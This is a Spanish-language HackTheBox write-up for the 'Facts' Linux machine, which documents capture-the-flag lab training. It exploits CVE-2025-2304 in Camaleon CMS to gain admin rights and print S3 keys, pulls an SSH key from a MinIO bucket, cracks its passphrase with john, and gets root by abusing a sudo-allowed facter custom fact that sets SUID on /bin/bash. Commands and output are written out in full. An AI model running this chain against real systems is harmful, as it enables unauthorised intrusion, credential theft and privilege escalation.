# HTB - Facts Writeup

**Autor:** TRNNSK
**Dificultad:** Medium
**Sistema:** Linux

---

# Resumen

La máquina **Facts** presenta una cadena de vulnerabilidades que debemos escalar para llegar al control total de root. Vamos a hacer uso de CVE-2025-2304, una vulnerabilidad de escalada de privilegios en Camaleon CMS 2.9.0, para obtener credenciales de un bucket MinIO, y posteriormente usar una clave SSH crackeada para obtener acceso inicial, escalando finalmente a root a través de una misconfiguration de sudo con `facter`.

---

# Enumeración

## Escaneo inicial

```bash
nmap -sS -sV -sC -T4 facts.htb
```

### Resultados (escaneo básico):

```
22/tcp open  ssh     OpenSSH 9.9p1
80/tcp open  http    nginx 1.26.3
```

### Resultados (escaneo completo de puertos):

```
22/tcp    open  ssh     OpenSSH 9.9p1
80/tcp    open  http    nginx 1.26.3
54321/tcp open  http    MinIO (Golang net/http server)
                        → redirige a http://facts.htb:9001
```

---

# Análisis Web

Al acceder al puerto 80 se identifica un CMS. Las rutas del CSS y JS revelan el framework:

```
/assets/themes/camaleon_first/assets/css/main-...css
/assets/themes/camaleon_first/assets/js/main-...js
```

La carpeta `camaleon_first` es el tema por defecto de **Camaleon CMS**, corriendo sobre Ruby on Rails. El panel de administración está en `/admin/login`.

---

# Vulnerabilidad: CVE-2025-2304

## Identificación

Se identifica que la aplicación corre **Camaleon CMS v2.9.0**, visible en el panel de administración. Esta versión es vulnerable a escalada de privilegios por **Mass Assignment**.

### Explicación técnica:

El método `updated_ajax` del `UsersController` usa `permit!` de Rails, que permite que **todos los parámetros pasen sin filtrado**, incluyendo el campo `role`. Cuando un usuario cambia su contraseña, se puede inyectar `role=admin` en la petición para escalar privilegios.

```ruby
def updated_ajax
  @user.update(params.require(:password).permit!)  # PELIGROSO: acepta todo
end
```

---

# Explotación (Foothold)

## Paso 1 — Crear una cuenta

Nos registramos como usuario normal en `http://facts.htb/admin/login`.

## Paso 2 — Explotar CVE-2025-2304 y extraer credenciales S3

```bash
git clone https://github.com/Alien0ne/CVE-2025-2304
cd CVE-2025-2304
python3 exploit.py -u http://facts.htb -U USUARIO -P PASSWORD -e
```

### Output:

```
[+]Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)
[+]Login confirmed
   User ID: 6
   Current User Role: client
[+]Loading PRIVILEGE ESCALATION
   User ID: 6
   Updated User Role: admin
[+]Extracting S3 Credentials
   s3 access key: AKIA836978DA7A84CC2B
   s3 secret key: QbgWmP7LMtHt4+QR1IoZCcSB7aXAJvcZZHAjwpEt
   s3 endpoint: http://localhost:54321
[+]Reverting User Role
```

## Paso 3 — Enumerar buckets MinIO con las credenciales obtenidas

```bash
aws configure set aws_access_key_id AKIA836978DA7A84CC2B
aws configure set aws_secret_access_key "QbgWmP7LMtHt4+QR1IoZCcSB7aXAJvcZZHAjwpEt"
aws s3 ls --endpoint-url http://facts.htb:54321
```

### Output:

```
2025-09-11 08:06:52 internal
2025-09-11 08:06:52 randomfacts
```

El bucket `internal` resulta ser el directorio home de un usuario:

```bash
aws s3 ls s3://internal --endpoint-url http://facts.htb:54321
```

```
PRE .bundle/
PRE .cache/
PRE .ssh/
    .bash_logout
    .bashrc
    .lesshst
    .profile
```

## Paso 4 — Descargar la clave SSH

```bash
aws s3 cp s3://internal/.ssh/ ./.ssh/ --recursive --endpoint-url http://facts.htb:54321
```

La clave privada `id_ed25519` está encriptada con bcrypt. La crackeamos con john:

```bash
ssh2john ./id_ed25519 > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Output:

```
dragonballz      (id_ed25519)
```

## Paso 5 — Acceso SSH

```bash
chmod 600 ./id_ed25519
ssh -i ./id_ed25519 trivia@facts.htb
# passphrase: dragonballz
```

Con esto obtenemos shell como `trivia` y podemos recoger la flag de usuario:

```bash
cat /home/trivia/user.txt
```

---

# Escalada de Privilegios

## Enumeración

```bash
sudo -l
```

### Output:

```
User trivia may run the following commands on facts:
    (root) NOPASSWD: /usr/bin/facter
```

`facter` es una herramienta de Puppet para recopilar información del sistema, escrita en Ruby. Permite cargar **custom facts** desde un directorio con el flag `--custom-dir`. Si ese directorio contiene código Ruby, lo ejecuta con los privilegios del proceso — en este caso, root.

## Explotación

```bash
# Crear directorio de facts malicioso
mkdir /tmp/facts

# Crear un fact que ponga SUID en /bin/bash
cat > /tmp/facts/evil.rb << 'EOF'
Facter.add('evil') do
  setcode do
    system('chmod +s /bin/bash')
  end
end
EOF

# Ejecutar facter como root cargando nuestro directorio
sudo facter --custom-dir /tmp/facts evil
```

Esto modifica `/bin/bash` en disco de forma permanente, añadiéndole el bit SUID con dueño root:

```
ANTES:  -rwxr-xr-x root root /bin/bash
DESPUÉS: -rwsr-xr-x root root /bin/bash
```

## Obtener shell root

```bash
bash -p
id
# uid=1001(trivia) gid=1001(trivia) euid=0(root)
```

El flag `-p` le indica a bash que no descarte el EUID elevado que obtiene por el bit SUID.

---

# Obtener la Flag

```bash
cat /root/root.txt
```

---

# TLDR MUCHO TEXTO

1. Escanear con Nmap (incluyendo todos los puertos)
2. Identificar Camaleon CMS 2.9.0 en puerto 80
3. Crear cuenta de usuario normal
4. Explotar CVE-2025-2304 para escalar a admin y extraer credenciales MinIO/S3
5. Enumerar buckets MinIO con awscli
6. Descargar clave SSH del bucket `internal`
7. Crackear la passphrase de la clave con john y rockyou
8. Hacer login via SSH como trivia
9. Identificar sudo sobre facter
10. Crear custom fact malicioso que ponga SUID en /bin/bash
11. Ejecutar `bash -p` para obtener shell root

---

# Conclusión

Esta máquina demuestra cómo:

- Una vulnerabilidad de Mass Assignment permite escalar de usuario normal a administrador sin necesidad de credenciales elevadas
- Los servicios de almacenamiento interno (MinIO) pueden exponer información sensible como claves SSH cuando se obtienen credenciales de acceso
- Las claves SSH con passphrases débiles son vulnerables a ataques de diccionario
- Herramientas de administración con permisos sudo como `facter` pueden ser abusadas para modificar binarios del sistema y obtener root

---

y ya
